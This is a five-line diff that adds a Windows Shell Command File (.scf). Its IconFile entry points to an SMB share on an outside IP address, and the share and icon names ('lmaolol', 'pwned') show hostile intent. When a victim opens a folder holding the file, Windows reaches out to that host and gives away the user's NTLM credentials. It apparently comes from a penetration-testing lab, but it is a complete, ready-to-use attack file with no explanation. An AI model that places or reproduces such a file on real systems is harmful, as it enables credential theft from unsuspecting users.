@@ -1,0 +1,5 @@
+[Shell]
+Command=2
+IconFile=\\10.10.16.4\lmaolol\pwned.ico
+[Taskbar]
+Command=ToogleDesktop
